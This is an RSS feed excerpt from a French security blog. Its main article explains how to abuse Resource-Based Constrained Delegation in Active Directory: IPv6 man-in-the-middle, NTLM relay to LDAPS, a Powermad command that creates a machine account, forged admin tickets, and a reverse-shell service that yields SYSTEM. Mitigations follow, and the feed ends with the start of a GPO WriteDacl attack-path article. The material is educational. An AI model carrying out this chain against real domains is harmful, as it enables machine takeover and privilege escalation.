&lt;p&gt;Tant que les équipes de défense réfléchiront en mode liste et les attaquants en mode graphe, ces derniers auront une longueur d’avance. C’est pourquoi &lt;strong&gt;BloodHound&lt;/strong&gt; peut également être utilisé en tant qu’outil de défense. Il suffit de lancer une collecte d’information régulièrement et de préparer quelques requêtes pour vérifier l’état de l’Active Directory et pour monitorer son évolution.&lt;/p&gt;

&lt;p&gt;BloodHound présente finalement une nouvelle approche pour visualiser les données dans un environnement Active Directory. La modélisation en mode graphe permet de comprendre les relations et intrications complexes des objets et relations dans le système d’information, pour en ressortir des chemins d’attaque ou des comportement anormaux.&lt;/p&gt;
</description>
        <pubDate>Tue, 30 Jul 2019 16:12:41 +0200</pubDate>
        <link>http://localhost:4000//bloodhound/</link>
        <guid isPermaLink="true">http://localhost:4000//bloodhound/</guid>
        
        <category>Active Directory</category>
        
        <category>Windows</category>
        
        
      </item>
    
      <item>
        <title>Resource-Based Constrained Delegation - Risques</title>
        <description>&lt;p&gt;Cet article montre comment abuser de la délégation contrainte basée sur les ressources (resource-based constrained delegation) afin de prendre le contrôle de machines.&lt;/p&gt;

&lt;!--more--&gt;

&lt;p&gt;Il repose sur du contenu d’excellente qualité. J’ai tenté de résumer avec des mots simples une petite partie du travail de &lt;a href=&quot;https://twitter.com/elad_shamir&quot;&gt;Elad Shamir&lt;/a&gt;. Son article &lt;a href=&quot;https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html&quot;&gt;Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory&lt;/a&gt; est incroyable de par ses recherches. D’autres articles ont suivi, notamment celui de &lt;a href=&quot;https://twitter.com/_dirkjan&quot;&gt;Dirk-jan&lt;/a&gt; (&lt;a href=&quot;https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/&quot;&gt;The worst of both worlds: Combining NTLM Relaying and Kerberos delegation &lt;/a&gt;) ou celui de &lt;a href=&quot;https://twitter.com/harmj0y&quot;&gt;Harmj0y&lt;/a&gt; (&lt;a href=&quot;https://www.harmj0y.net/blog/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/&quot;&gt;A Case Study in Wagging the Dog: Computer Takeover&lt;/a&gt;), me permettant d’assembler toutes les pièces et de rédiger cet article.&lt;/p&gt;

&lt;p&gt;Vous êtes prêts ? Let’s dive in.&lt;/p&gt;

&lt;h2 id=&quot;rappels--resource-based-constrained-delegation&quot;&gt;Rappels : Resource-Based Constrained Delegation&lt;/h2&gt;

&lt;p&gt;Dans cet article, le terme “Resource-Based” sera utilisé pour parler de cette délégation.&lt;/p&gt;

&lt;p&gt;Contrairement à la &lt;a href=&quot;/unconstrained-delegation-attack&quot;&gt;délégation complète&lt;/a&gt;, la délégation Resource-Based est un poil plus compliquée. L’idée générale est que ce sont les ressources de fin de chaine qui décident si oui ou non un service peut s’authentifier auprès d’elles en tant qu’un autre utilisateur. Ces ressources ont donc une liste de comptes en lesquels elles ont confiance. Si une ressource fait confiance au compte &lt;code class=&quot;highlighter-rouge&quot;&gt;WEBSERVER$&lt;/code&gt;, alors quand un utilisateur s’authentifiera auprès de &lt;code class=&quot;highlighter-rouge&quot;&gt;WEBSERVER$&lt;/code&gt;, il pourra lui même s’authentifier auprès de cette ressource en tant que l’utilisateur.&lt;/p&gt;

&lt;p&gt;En revanche, si un autre utilisateur s’authentifie auprès d’un compte qui ne fait pas partie de la liste de confiance du service (par exemple &lt;code class=&quot;highlighter-rouge&quot;&gt;FILESERVER$&lt;/code&gt; ou &lt;code class=&quot;highlighter-rouge&quot;&gt;Sql_SVC&lt;/code&gt; dans le schéma ci-dessous), ce compte ne pourra pas se faire passer pour cet utilisateur auprès du service.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/02/resource_based_constrained_delegation_schema.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/02/resource_based_constrained_delegation_schema.png&quot; alt=&quot;Resource Based Constrained Delegation&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Concrètement, comme expliqué dans l’&lt;a href=&quot;/constrained-unconstrained-delegation/#kerberos-constrained-delegation&quot;&gt;article sur la délégation&lt;/a&gt;, la ressource finale, à droite sur le schéma, a un attribut appelé &lt;code class=&quot;highlighter-rouge&quot;&gt;msDS-AllowedToActOnBehalfOfOtherIdentity &lt;/code&gt; qui contient la liste des comptes en lesquels elle a confiance.&lt;/p&gt;

&lt;p&gt;Par ailleurs, pour que cette délégation fonctionne, l’attribut &lt;code class=&quot;highlighter-rouge&quot;&gt;ADS_UF_NOT_DELEGATED&lt;/code&gt; de l’utilisateur ne doit pas être positionné. C’est un attribut qui permet d’interdire la délégation en vue de protéger le compte des attaques liées à la délégation.&lt;/p&gt;

&lt;p&gt;Notons également que pour relayer l’authentification d’un utilisateur, le compte de service “relai” (&lt;code class=&quot;highlighter-rouge&quot;&gt;WEBSERVER$&lt;/code&gt; dans le schéma) doit avoir un TGS provenant de l’utilisateur.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Si l’utilisateur s’authentifie via Kerberos&lt;/strong&gt;, aucun soucis, le service “relai” est en possession du TGS de l’utilisateur, donc le mécanisme (&lt;strong&gt;S4U2Proxy&lt;/strong&gt;) est simple, le compte de service envoie le TGS de l’utilisateur au contrôleur de domaine pour que celui-ci lui renvoie un TGS valide pour accéder à la ressource désirée (si bien sûr le compte de service fait partie de la liste de confiance de la ressource).&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/02/resource_based_constrained_delegation_schema_detailed.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/02/resource_based_constrained_delegation_schema_detailed.png&quot; alt=&quot;Resource Based Constrained Delegation Detailed&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;En revanche, &lt;strong&gt;si l’utilisateur s’authentifie d’une autre manière&lt;/strong&gt; (NTLM par exemple), le compte de service n’a pas reçu de TGS. Il va alors devoir faire une première demande pour avoir un TGS transférable au nom de l’utilisateur, c’est le mécanisme &lt;strong&gt;S4U2Self&lt;/strong&gt;, puis il utilisera ce TGS transférable pour faire le processus expliqué juste avant, &lt;strong&gt;S4U2Proxy&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/02/s4u2self.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/02/s4u2self.png&quot; alt=&quot;S4U2Self&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;comportement-by-design&quot;&gt;Comportement “by design”&lt;/h2&gt;

&lt;p&gt;Maintenant que ces rappels sont faits, il est intéressant de creuser un peu. En effet, on se rend compte que le mécanisme &lt;strong&gt;S4U2Self&lt;/strong&gt; peut être assez dangereux, parce qu’un service peut finalement demander un TGS &lt;strong&gt;au nom de n’importe quel utilisateur&lt;/strong&gt;. Dans le processus normal, il demande un TGS au nom de l’utilisateur qui s’est authentifié auprès de lui, mais rien ne l’oblige à se limiter à ce compte.&lt;/p&gt;

&lt;p&gt;Heureusement, cette possibilité de demander des TGS transférables au nom de n’importe qui (S4U2Self) n’est possible que pour les comptes ayant l’attribut &lt;code class=&quot;highlighter-rouge&quot;&gt;TrustedToAuthForDelegation&lt;/code&gt; de positionné, ce qui n’est pas un attribut positionné par défaut, et qu’on trouve rarement en entreprise.&lt;/p&gt;

&lt;p&gt;Plus précisemment, &lt;strong&gt;tous les comptes de service peuvent faire un S4U2Self&lt;/strong&gt;, mais seuls ceux avec l’attribut &lt;code class=&quot;highlighter-rouge&quot;&gt;TrustedToAuthForDelegation&lt;/code&gt; recevront un TGS &lt;strong&gt;transférable&lt;/strong&gt;, condition à priori nécessaire pour S4U2Proxy (cf. &lt;a href=&quot;https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/ad98268b-f75b-42c3-b09b-959282770642&quot;&gt;la documentation Microsoft&lt;/a&gt;).&lt;/p&gt;

&lt;p&gt;Ainsi, par exemple, lors d’une délégation contrainte (&lt;strong&gt;pas&lt;/strong&gt; Resource-Based), si un compte machine demande un TGS via S4U2Self sans avoir l’attribut &lt;code class=&quot;highlighter-rouge&quot;&gt;TrustedToAuthForDelegation&lt;/code&gt;, ce compte recevra un TGS &lt;strong&gt;non transférable&lt;/strong&gt;, et lors de la demande de TGS pour une ressource (S4U2Proxy), ce sera refusé puisque ce TGS ne peut pas être transféré.&lt;/p&gt;

&lt;p&gt;En revanche, et &lt;strong&gt;c’est là que c’est super incroyable&lt;/strong&gt;, dans le cas de la délégation &lt;strong&gt;Resource-Based&lt;/strong&gt;, si de la même manière un compte machine demande un TGS via S4U2Self sans avoir l’attribut &lt;code class=&quot;highlighter-rouge&quot;&gt;TrustedToAuthForDelegation&lt;/code&gt;, ce compte recevra un TGS &lt;strong&gt;qui sera toujours non transférable&lt;/strong&gt;, mais lors de la demande de TGS pour une ressource (S4U2Proxy), cette demande &lt;strong&gt;SERA ACCEPTÉE&lt;/strong&gt; (cf. encore &lt;a href=&quot;https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/c6f6f8b3-1209-487b-881d-d0908a413bb7&quot;&gt;la documentation Microsoft&lt;/a&gt;).&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/04/s4u2selfok.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/04/s4u2selfok.png&quot; alt=&quot;S4U2Self without transferable&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Dans cet exemple, le &lt;code class=&quot;highlighter-rouge&quot;&gt;SERVEUR1$&lt;/code&gt; n’a pas l’attribut &lt;code class=&quot;highlighter-rouge&quot;&gt;TrustedToAuthForDelegation&lt;/code&gt; de positionné, mais il est déclaré dans la liste de confiance de &lt;code class=&quot;highlighter-rouge&quot;&gt;Service B&lt;/code&gt;. Lors de sa demande de TGS pour un utilisateur lambda via S4U2Self, le contrôleur de domaine lui envoie un TGS &lt;strong&gt;non transférable&lt;/strong&gt;, cependant en passant ce TGS à la requête S4U2Proxy afin de récupérer un TGS pour utiliser le &lt;code class=&quot;highlighter-rouge&quot;&gt;Service B&lt;/code&gt;, il n’y a aucun soucis, ça fonctionne, et &lt;code class=&quot;highlighter-rouge&quot;&gt;SERVEUR1$&lt;/code&gt; peut utiliser &lt;code class=&quot;highlighter-rouge&quot;&gt;Service B&lt;/code&gt; en tant que l’utilisateur choisi.&lt;/p&gt;

&lt;p&gt;Au cas où ce n’est toujours pas clair, ça veut dire que &lt;code class=&quot;highlighter-rouge&quot;&gt;SERVEUR1$&lt;/code&gt; peut s’authentifier auprès de &lt;code class=&quot;highlighter-rouge&quot;&gt;Service B&lt;/code&gt; en tant que &lt;strong&gt;n’importe quel utilisateur&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Et ouais.&lt;/p&gt;

&lt;h2 id=&quot;attribut-machine-account-quota&quot;&gt;Attribut Machine-Account-Quota&lt;/h2&gt;

&lt;p&gt;Pour pouvoir décrire un chemin d’attaque complet, il faut également parler de l’attribut &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/desktop/adschema/a-ms-ds-machineaccountquota&quot;&gt;msds-MachineAccountQuota&lt;/a&gt; qui est positionné sur le domaine. Cet attribut décrit le nombre de comptes machine qu’un utilisateur du domaine peut créer. Cet attribut vaut 10 par défaut. Cela signifie que, par défaut, un utilisateur peut joindre 10 machines au domaine, ou qu’il peut créer 10 comptes machine, en choisissant notamment leur nom et leur mot de passe.&lt;/p&gt;

&lt;p&gt;Ce comportement peut être modifié &lt;a href=&quot;https://social.technet.microsoft.com/wiki/contents/articles/5446.active-directory-how-to-prevent-authenticated-users-from-joining-workstations-to-a-domain.aspx&quot;&gt;par GPO&lt;/a&gt;, mais voilà, par défaut, c’est 10.&lt;/p&gt;

&lt;p&gt;Cet ajout peut être fait directement dans les paramètres d’une machine Windows, mais également via LDAP. Cette fonctionnalité est notamment disponible dans l’outil &lt;a href=&quot;https://github.com/Kevin-Robertson/Powermad&quot;&gt;Powermad&lt;/a&gt; de &lt;a href=&quot;https://twitter.com/kevin_robertson&quot;&gt;Kévin Robertson&lt;/a&gt;.&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;New-MachineAccount&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-MachineAccount&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;NOUVELLEMACHINE&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Password&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ConvertTo-SecureString&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Hackndo123+!&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-AsPlainText&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Force&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Cette fonctionnalité est importante parce que dans les histoires de délégation, les comptes concernés sont des comptes de service, c’est à dire des comptes avec un ou plusieurs SPN. Un utilisateur du domaine n’a pas d’attribut SPN, mais il peut créer un compte machine qui lui possède par défaut plusieurs SPN.&lt;/p&gt;

&lt;h2 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h2&gt;

&lt;p&gt;Nous avons maintenant tous les éléments en main pour décrire un chemin d’attaque. Il en existe d’autres, bien sûr, mais ce chemin permet d’assembler toutes les pièces du puzzle.&lt;/p&gt;

&lt;p&gt;Nous nous plaçons dans le cas d’une position &lt;em&gt;man-in-the-middle&lt;/em&gt; en utilisant le fait que IPv6 est majoritairement activé dans les réseaux d’entreprise, et que d’un point de vue OS, c’est ce protocole qu’il faut utiliser en priorité, avant IPv4. Un attaquant peut alors se positionner en serveur DHCP IPv6 et répondre aux équipements environnants.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/04/mitm6_wpad.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/04/mitm6_wpad.png&quot; alt=&quot;MITM6 Wpad&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Par ailleurs, il est possible de relayer une authentification HTTP d’une machine en une authentification LDAPS vers une autre. Nous relaierons les connexions vers le contrôleur de domaine.&lt;/p&gt;

&lt;p&gt;Lorsque la machine &lt;code class=&quot;highlighter-rouge&quot;&gt;DESKTOP-01&lt;/code&gt; va se connecter au réseau (reboot, branchement du cable réseau), le compte &lt;code class=&quot;highlighter-rouge&quot;&gt;DESKTOP-01$&lt;/code&gt; va se connecter en HTTP à notre machine du fait de notre position &lt;em&gt;man-in-the-middle&lt;/em&gt;. C’est à ce moment que le relai va être effectif.&lt;/p&gt;

&lt;p&gt;Deux actions vont être effectuées via LDAPS, en utilisant cette authentification relayée, en tant que &lt;code class=&quot;highlighter-rouge&quot;&gt;DESKTOP-01$&lt;/code&gt;.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Un compte machine &lt;code class=&quot;highlighter-rouge&quot;&gt;HACKNDO$&lt;/code&gt; va être créé, puisque le compte &lt;code class=&quot;highlighter-rouge&quot;&gt;DESKTOP-01$&lt;/code&gt; est un compte du domaine, et a le droit d’ajouter 10 comptes machine au domaine, par défaut.&lt;/li&gt;
  &lt;li&gt;Le compte machine &lt;code class=&quot;highlighter-rouge&quot;&gt;DESKTOP-01$&lt;/code&gt; a le droit de modifier certains de ses attributs, dont l’attribut &lt;code class=&quot;highlighter-rouge&quot;&gt;msDS-AllowedToActOnBehalfOfOtherIdentity&lt;/code&gt;, qui est la liste des machines de confiance pour la délégation “Resource-Based”. On va donc modifier cet attribut pour ajouter &lt;code class=&quot;highlighter-rouge&quot;&gt;HACKNDO$&lt;/code&gt; à cette liste de confiance.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/04/relai_ldap.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/04/relai_ldap.png&quot; alt=&quot;Relai LDAP&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Maintenant, nous avons la main sur le compte &lt;code class=&quot;highlighter-rouge&quot;&gt;HACKNDO$&lt;/code&gt;, puisque nous avons choisi son nom et son mot de passe lors de la création, et ce compte a la confiance de &lt;code class=&quot;highlighter-rouge&quot;&gt;DESKTOP-01$&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Il suffit alors de se connecter en tant que &lt;code class=&quot;highlighter-rouge&quot;&gt;HACKNDO$&lt;/code&gt;, faire une demande de TGS au nom d’un administrateur via &lt;code class=&quot;highlighter-rouge&quot;&gt;S4U2Self&lt;/code&gt;. Le contrôleur de domaine va nous répondre avec un TGS &lt;strong&gt;non transférable&lt;/strong&gt;. Nous demandons ensuite un TGS pour utiliser le service &lt;code class=&quot;highlighter-rouge&quot;&gt;CIFS&lt;/code&gt; de &lt;code class=&quot;highlighter-rouge&quot;&gt;DESKTOP-01&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;CIFS/DESKTOP-01&lt;/code&gt;) en fournissant le TGS précédemment demandé (S4U2Proxy). Comme nous l’avons vu au début, bien qu’il ne soit pas transférable, il est tout de même accepté, et le contrôleur de domaine nous envoie un TGS en tant qu’administrateur pour utiliser le service &lt;code class=&quot;highlighter-rouge&quot;&gt;CIFS&lt;/code&gt; de &lt;code class=&quot;highlighter-rouge&quot;&gt;DESKTOP-01&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Voici un petit schéma récapitulatif :&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/04/process_complete_relay.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/04/process_complete_relay.png&quot; alt=&quot;Processus complet&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Il est possible de répéter l’opération pour demander un TGS en vue de pouvoir gérer les services. Ainsi, en envoyant un exécutable de type “reverse-shell” sur la machine avec le ticket &lt;code class=&quot;highlighter-rouge&quot;&gt;CIFS&lt;/code&gt;, puis en créant et démarrant un service utilisant cet executable à l’aide d’un ticket &lt;code class=&quot;highlighter-rouge&quot;&gt;SCHEDULE&lt;/code&gt;, il est possible de prendre la main sur la machine en tant que SYSTEM.&lt;/p&gt;

&lt;h2 id=&quot;résumé&quot;&gt;Résumé&lt;/h2&gt;

&lt;p&gt;L’opération étant un peu complexe, voici les différentes étapes résumées :&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Ajouter une machine &lt;code class=&quot;highlighter-rouge&quot;&gt;M&lt;/code&gt; au domaine (via un relai d’authentification, via un compte de domaine déjà possédé, …)&lt;/li&gt;
  &lt;li&gt;Ajouter cette machine &lt;code class=&quot;highlighter-rouge&quot;&gt;M&lt;/code&gt; à la liste de confiance de la cible &lt;code class=&quot;highlighter-rouge&quot;&gt;C&lt;/code&gt; (i.e. l’ajouter à l’attribut &lt;code class=&quot;highlighter-rouge&quot;&gt;msDS-AllowedToActOnBehalfOfOtherIdentity&lt;/code&gt; en relayant l’authentification de la machine cible, puisqu’elle a le droit de changer son propre attribut)&lt;/li&gt;
  &lt;li&gt;Faire une demande de TGS pour un ticket au nom d’un administrateur via S4U2Self&lt;/li&gt;
  &lt;li&gt;Une fois en possession de ce ticket, l’envoyer au contrôleur de domaine pour demander un TGS vers la cible &lt;code class=&quot;highlighter-rouge&quot;&gt;C&lt;/code&gt; via S4U2Proxy.&lt;/li&gt;
  &lt;li&gt;Enjoy ce nouveau ticket valide, en tant que l’administrateur choisi. D’autres tickets peuvent être demandés avec l’étape 4.&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;La délégation “Resource-Based” est un procédé complexe, tellement complexe que des problématiques de sécurité sont introduites dans l’implémentation de la fonctionnalité.&lt;/p&gt;

&lt;p&gt;Ce qu’il faut finalement retenir, c’est qu’il est possible de prendre la main sur une machine lorsqu’on a la possibilité de modifier sa liste de confiance dans le cadre de la délégation basée sur les ressources.&lt;/p&gt;

&lt;p&gt;Pour s’en prémunir, plusieurs actions sont possibles. Tout d’abord, il faut implémenter le &lt;a href=&quot;https://support.microsoft.com/en-us/help/4034879/how-to-add-the-ldapenforcechannelbinding-registry-entry&quot;&gt;channel binding&lt;/a&gt; au niveau de LDAP afin d’empêcher le relai vers LDAPS. Ensuite, il faut limiter la possibilité de création de comptes machine sur le domaine à des groupes définis d’utilisateurs. Enfin, en lien avec cet exemple, IPv6 devrait être désactivé dans les réseaux d’entreprise, puisqu’il ne répond à aucun besoin.&lt;/p&gt;

&lt;p&gt;Cet article étant relativement dense, il serait tout à fait normal que des points ne soient pas tout à fait clairs. Si vous avez des questions, n’hésitez pas à les poser en commentaire ou sur &lt;a href=&quot;https://discord.gg/9At6SUZ&quot; target=&quot;blank&quot;&gt;Discord&lt;/a&gt;. Vous pouvez toujours suivre la sortie de nouveaux articles sur mon twitter &lt;a href=&quot;https://twitter.com/HackAndDo&quot; target=&quot;blank&quot;&gt;@hackanddo&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Enfin, n’hésitez pas à faire un tour sur les ressources citées, notamment l’article de &lt;a href=&quot;https://twitter.com/elad_shamir&quot;&gt;Elad Shamir&lt;/a&gt; qui est un travail de recherche complet et super intéressant.&lt;/p&gt;

&lt;h2 id=&quot;ressources&quot;&gt;Ressources&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html&quot;&gt;Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory&lt;/a&gt; par &lt;a href=&quot;https://twitter.com/elad_shamir&quot;&gt;Elad Shamir&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/&quot;&gt;The worst of both worlds: Combining NTLM Relaying and Kerberos delegation &lt;/a&gt; par &lt;a href=&quot;https://twitter.com/_dirkjan&quot;&gt;Dirk-jan&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.harmj0y.net/blog/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/&quot;&gt;A Case Study in Wagging the Dog: Computer Takeover&lt;/a&gt; par &lt;a href=&quot;https://twitter.com/harmj0y&quot;&gt;Harmj0y&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
        <pubDate>Sun, 05 May 2019 12:28:42 +0200</pubDate>
        <link>http://localhost:4000//resource-based-constrained-delegation-attack/</link>
        <guid isPermaLink="true">http://localhost:4000//resource-based-constrained-delegation-attack/</guid>
        
        <category>Active Directory</category>
        
        <category>Windows</category>
        
        
      </item>
    
      <item>
        <title>GPO - Chemin d'attaque</title>
        <description>&lt;p&gt;Cet article présente ce qu’est une GPO (Group Policy Object) puis décrit un chemin d’attaque possible lorsqu’un attaquant a le droit de modifier les paramètres d’une GPO qui s’applique à des utilisateurs.&lt;/p&gt;

&lt;!--more--&gt;

&lt;h2 id=&quot;group-policy-object&quot;&gt;Group Policy Object&lt;/h2&gt;

&lt;h3 id=&quot;définition&quot;&gt;Définition&lt;/h3&gt;

&lt;p&gt;Parmi les différents rôles d’un Active Directory se trouve le rôle de gestion du parc. Active Directory permet de gérer l’ensemble des machines et utilisateurs du système d’information, et pour cela les “stratégies de groupe” (Group Policy Objects - GPO) sont un outil indispensable.&lt;/p&gt;

&lt;p&gt;Concrètement, les GPO sont un ensemble de règles/actions qui s’appliquent à un ensemble bien défini d’objets. Une GPO permet de faire beaucoup, beaucoup de choses.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/04/example_gpo.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/04/example_gpo.png&quot; alt=&quot;Example GPO&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Comme on le voit sur cette capture d’écran, il est possible de créer/modifier des scripts au démarrage et à l’arrêt d’une machine, de changer les paramètres du pare-feu, de créer des tâches planifiées, ou même d’ajouter des utilisateurs au groupe local d’administration. Ce ne sont que des exemples parmi tant d’autres pour montrer à quel point les fonctionnalités imposables via GPO sont diverses et puissantes.&lt;/p&gt;

&lt;h3 id=&quot;composition&quot;&gt;Composition&lt;/h3&gt;

&lt;p&gt;Une GPO est composée de deux éléments :&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Un conteneur (Group Policy Container - GPC), qui est l’objet enregistré dans l’Active Directory, sous le groupe &lt;code class=&quot;highlighter-rouge&quot;&gt;adsec.local &amp;gt; system &amp;gt; policies&lt;/code&gt;. Chaque GPO est identifiée par un identifiant unique dans le domaine.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/04/gpc.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/04/gpc.png&quot; alt=&quot;GPC&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;C’est ici que sont gérés finement les droits de création/modification des GPO, comme tout objet de l’Active Directory.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Les fichiers qui contiennent les informations à appliquer sur les machines ou les utilisateurs. Ces fichiers sont présents sur chaque contrôleur de domaine, dans le partage réseau &lt;code class=&quot;highlighter-rouge&quot;&gt;\\dc-01.adsec.local\SYSVOL\adsec.local\Policies\&lt;/code&gt;, et sont organisés dans des dossiers : Un dossier par GPO, le nom du dossier étant l’identifiant unique correspondant au conteneur GPC.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/04/gpo_files.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/04/gpo_files.png&quot; alt=&quot;GPO files&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;C’est grâce à l’exposition de ces fichiers aux comptes de domaine que ces derniers peuvent mettre à jour leurs GPO.&lt;/p&gt;

&lt;h2 id=&quot;contexte-de-recherche&quot;&gt;Contexte de recherche&lt;/h2&gt;

&lt;p&gt;Dans ma croisade en plein Active Directory, j’utilise de manière très intense l’outil &lt;a href=&quot;https://github.com/BloodHoundAD/BloodHound&quot;&gt;Bloodhound&lt;/a&gt; développé par &lt;a href=&quot;https://twitter.com/_wald0&quot;&gt;@wald0&lt;/a&gt;, &lt;a href=&quot;https://twitter.com/harmj0y&quot;&gt;@Harmj0y&lt;/a&gt; et &lt;a href=&quot;https://twitter.com/cptjesus&quot;&gt;@CptJesus&lt;/a&gt;, que je ne remercierai jamais assez pour leur travail et leur disponibilité sur leur slack &lt;a href=&quot;https://bloodhoundgang.herokuapp.com/&quot;&gt;BloodHoundHQ&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Après avoir regardé la &lt;a href=&quot;https://www.youtube.com/watch?v=0r8FzbOg2YU&amp;amp;list=PL1eoQr97VfJnvOWo_Jxk2qUrFyB-BJh4Y&amp;amp;index=4&amp;amp;t=0s&quot;&gt;prise de parole&lt;/a&gt; de &lt;a href=&quot;https://twitter.com/_wald0&quot;&gt;@wald0&lt;/a&gt; et &lt;a href=&quot;https://twitter.com/cptjesus&quot;&gt;@CptJesus&lt;/a&gt; à la conférence &lt;a href=&quot;https://www.troopers.de/&quot;&gt;WeAreTroopers&lt;/a&gt;, j’ai commencé à me pencher sur les chemins d’attaque impliquant les GPO. Bloodhound aide énormément sur ce sujet, et propose notamment un chemin d’attaque lorsqu’un compte du domaine a les droits &lt;code class=&quot;highlighter-rouge&quot;&gt;WriteDacl&lt;/code&gt; sur une GPO.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/04/bh_path.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/04/bh_path.png&quot; alt=&quot;BloodHound Path&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Sur ce schéma, on voit un utilisateur avec un crâne, correspondant à un compte compromis. Ce compte fait partie d’un groupe qui possède les droits &lt;code class=&quot;highlighter-rouge&quot;&gt;WriteDacl&lt;/code&gt; sur une GPO. Cette GPO s’applique enfin à une unité d’organisation (OU) contenant notamment l’utilisateur en bas à droite, cible de l’attaque.&lt;/p&gt;

&lt;p&gt;Ce droit &lt;code class=&quot;highlighter-rouge&quot;&gt;WriteDacl&lt;/code&gt; permet aux membres du groupe de modifier les ACL (Access Control List) de la GPO concernée, c’est à dire les droits d’accès à la GPO, notamment la modification du propriétaire de l’objet. Ainsi, un utilisateur du groupe possédant ce droit peut s’auto-proclamer propriétaire, pour ensuite la modifier arbitrairement.&lt;/p&gt;

